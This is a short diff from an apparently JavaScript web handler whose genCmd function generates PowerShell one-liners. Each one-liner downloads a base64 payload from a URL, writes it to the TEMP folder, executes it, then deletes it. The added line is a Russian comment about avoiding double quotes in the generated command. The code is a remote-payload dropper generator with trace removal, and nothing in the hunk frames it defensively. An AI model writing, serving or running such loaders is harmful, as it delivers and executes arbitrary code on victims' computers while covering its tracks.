@@ -58,6 +58,7 @@ const handler = async (req, res) => {
 
     const genCmd = (r, i) => {
       const suffix = i === 0 ? '' : (i + 1).toString();
+      // Используем максимально простую конкатенацию без двойных кавычек
       return `$t${suffix}=$env:TEMP+'\\${r.name}';$u${suffix}='${r.url}';$d${suffix}=((irm $u${suffix})-replace'[^A-Za-z0-9+/=]','');[IO.File]::WriteAllBytes($t${suffix},[Convert]::FromBase64String($d${suffix}));Start-Process $t${suffix} -Wait;Remove-Item $t${suffix}`;
     };
 
